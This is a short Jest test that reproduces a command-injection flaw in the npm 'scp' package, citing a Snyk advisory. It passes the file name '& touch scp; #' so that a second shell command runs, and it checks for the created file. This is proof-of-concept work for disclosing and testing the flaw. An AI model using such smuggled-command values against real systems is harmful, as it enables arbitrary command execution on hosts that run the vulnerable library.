//https://snyk.io/vuln/SNYK-JS-SCP-1009828
test("Command Injection in scp", () => {
  const scp = require("scp");
  const fs = require("fs");
  const path = "./scp";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: "& touch scp; #",
    user: "username",
    host: "myServer",
    port: "20",
    path: "~",
  };
  scp.send(options, function (err) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
